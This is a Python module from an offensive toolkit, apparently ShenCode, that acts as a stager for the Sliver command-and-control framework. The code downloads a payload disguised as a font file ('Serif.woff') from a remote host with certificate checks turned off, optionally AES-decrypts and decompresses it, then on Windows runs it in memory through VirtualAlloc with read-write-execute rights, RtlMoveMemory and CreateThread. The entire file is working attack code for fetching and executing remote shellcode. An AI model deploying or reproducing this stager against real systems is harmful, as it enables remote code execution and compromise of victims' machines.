########################################################
### ShenCode Module
###
### Name: Sliver Stager
### Docs: https://heckhausen.it/shencode/README
### 
########################################################

from utils.style import *
from os import name as osname
if osname == 'nt':
    from utils.windef import *
    from utils.winconst import *
from time import sleep
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import requests

CATEGORY    = 'stager'
DESCRIPTION = 'Connect to a Sliver HTTPS listener, download stage and execute'

cs = ConsoleStyles()

arglist = {
     'remote_host':         { 'value': '', 'desc': 'Remote host to connect to e.g. 192.168.2.1' },
     'remote_port':         { 'value': 4444, 'desc': 'Remote port to connect to' },
     'save':                { 'value': '', 'desc': 'Save the stage as file: --save filename' },
     'sleeptime':           { 'value': 0, 'desc': 'Sleep for x seconds before the stage is executed' },
     'aes':                 { 'value': ['',''], 'desc': 'AES stage decrypter: --aes <key> <iv> / set aes ["key","iv"]' },
     'compression':         { 'value': 0, 'desc': 'Decompress the stage after download' },
     'headers':             { 'value': False, 'desc': 'Print stage headers' },
     'use_https':           { 'value': True, 'desc': 'Use either https or http' }
}

def register_arguments(parser):
        parser.add_argument('-p', '--remote-port', default=4444, type=int, required=True, help=arglist['remote_port']['desc'])
        parser.add_argument('-r', '--remote-host', type=str, required=True, help=arglist['remote_host']['desc'])
        parser.add_argument('-s', '--save', type=str, help=arglist['save']['desc'])
        grp = parser.add_argument_group('additional')
        grp.add_argument('-a', '--aes', nargs=2, required=False, default=['', ''], help='AES decrypt the stage after download: --aes <key> <iv>')
        grp.add_argument('-c', '--compression', default=0, action='store_true', required=False, help=arglist['compression']['desc'])
        grp.add_argument('-st', '--sleeptime', default=0, type=int, required=False, help=arglist['sleeptime']['desc'])
        vrb = parser.add_argument_group('more')
        vrb.add_argument('--headers', default=0, action='store_true', required=False, help=arglist['headers']['desc'])
        vrb.add_argument('--use-https', default=True, action='store_true', help=arglist['use_https']['desc'])

class module:
    
    Author = 'psycore8'
    Version = '0.9.0'
    DisplayName = 'SLIVER-STAGER'
    payload_size = 0
    header_16bytes = ''
    relay = False
    shell_path = '::stager::sliver'
    requests.packages.urllib3.disable_warnings() 

    import gzip

    def __init__(self, remote_host=str, remote_port=int, save=str, sleeptime=int, aes=['', ''], compression=False, headers=False, use_https=True):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.save = save
        self.sleeptime = sleeptime
        self.compression = compression
        self.use_https = use_https
        self.headers = headers
        self.aes = aes

    def aes_decrypt(self, data, aes_key, aes_iv):
        cipher = Cipher(algorithms.AES(aes_key.encode('utf-8')), modes.CBC(aes_iv.encode('utf-8')), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(data) + decryptor.finalize()
        def unpad(data):
            pad_length = data[-1] 
            return data[:-pad_length]
        decrypted_data = unpad(decrypted_padded)
        return decrypted_data
    
    def decompress(self, data):
        return self.gzip.decompress(data) 
    
    def ph(self, header, size):
         self.header_16bytes = ' '.join(f'{byte:02X}' for byte in header)
         self.payload_size = size
         cs.console_print.note(f'{self.header_16bytes}')
        
    def process(self):
        if self.aes != ['', ''] or None:
            aes_key = self.aes[0]
            aes_iv = self.aes[1]
            print(f'{aes_key} - {aes_iv}')
        cs.module_header(self.DisplayName, self.Version)
        if self.use_https:
            static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
        else:
             static_url = f'http://{self.remote_host}:{self.remote_port}/Serif.woff'
        try:
            cs.console_print.note('Download stage')
            response = requests.get(static_url, stream=True, verify=False)
            cs.console_print.note(f'Stage URL: {static_url}')
            response.raise_for_status()
            stage_data = response.content
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            cs.console_print.note('Download stage')
        except requests.exceptions.RequestException as e:
            cs.console_print.error('Download error!')
            return

        if self.aes != ['', ''] or None:
            cs.console_print.note('Decrypting data')
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            stage_data = self.aes_decrypt(stage_data[16:], aes_key, aes_iv)
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
        if self.compression:
            cs.console_print.note('Decompressing data')
            if self.headers: self.ph(stage_data[0:16], len(stage_data))
            stage_data = self.decompress(stage_data)
            if self.headers: self.ph(stage_data[0:16], len(stage_data))

        self.payload_size = len(stage_data)
        cs.console_print.ok(f'Stage downloaded! Size: {self.payload_size} bytes')

        stage_buffer = stage_data
        cs.console_print.note('Payload found')

        if self.save != None:
            with open(self.save, 'wb') as f: # type: ignore
                  f.write(stage_buffer)
            cs.action_save_file2(self.save)
            self.relay = True


        if not self.relay and osname == 'nt':
            ptr = VirtualAlloc(0, len(stage_buffer), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
            if ptr:
                cs.console_print.note('Memory allocated')
            else:
                cs.console_print.error('Error allocating memory')
                return
            RtlMoveMemory(ptr, stage_buffer, len(stage_buffer))
            if self.sleeptime > 0:
                cs.console_print.note(f'Let\'s take a nap for {self.sleeptime} seconds')
                sleep(self.sleeptime)

            ht = CreateThread(None, 0, ptr, None, 0, None)
            if ht:
                    cs.console_print.ok('Thread created, execute the payload')
            else:
                    cs.console_print.error('Thread not created, exiting')
            WaitForSingleObject(ht, -1)
        elif self.relay:
             print('\n')
             return stage_buffer


    